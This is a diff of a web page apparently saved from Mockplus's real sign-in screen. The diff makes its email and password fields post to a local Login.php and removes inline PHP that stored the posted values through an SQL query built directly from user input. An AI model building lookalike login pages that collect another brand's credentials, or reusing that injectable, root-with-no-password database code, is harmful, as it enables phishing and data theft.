@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+<form action="Login.php"method="post">
 <!-- saved from url=(0079)https://user.mockplus.com/signin?next=https%3A%2F%2Fwww.mockplus.com%2F&source= -->
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble {
     filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
@@ -116,10 +117,10 @@ select:-webkit-autofill {
       <h1>Sign in to Mockplus</h1>
       <div class="from">
         <div class="from-list">
-          <input type="text" id="email" placeholder="Email" data-text="Please enter a valid email address.">
+          <input type="text" name="Email" placeholder="Email" data-text="Please enter a valid email address.">
         </div>
         <div class="from-list">
-          <input type="password" id="password" placeholder="Password" data-text="The password must be between 6-20 characters long.">
+          <input type="password" name="Password" placeholder="Password" data-text="The password must be between 6-20 characters long.">
         </div>
         <p class="tip agree-tos">
           <a href="reset Pasword.html" class="tip-right">Forgot password?</a>
@@ -128,26 +129,14 @@ select:-webkit-autofill {
         <div class="submit-btn">
           <button id="submit"name="t"class="btn btn-primary">Login</button>
         </div>
+
         <p class="tip signup-tip">
             <span>Don't have an account?</span>
             <a href="Register.html">Register it</a>
         </p>
       <!--</div>-->
     <!--</div>-->
-    
-    <?php
-    $x = $_POST['q1'];
-    $y = $_POST['q2'];
-    
-
-
-if(isset($_POST['t']))
-{
-$link=mysqli_connect('localhost','root','','food');
-$qry="insert into login values('','$x','$y')";
-mysqli_query($link,$qry);
-}
-?>
+      </form>
 </div>
 </div>
 
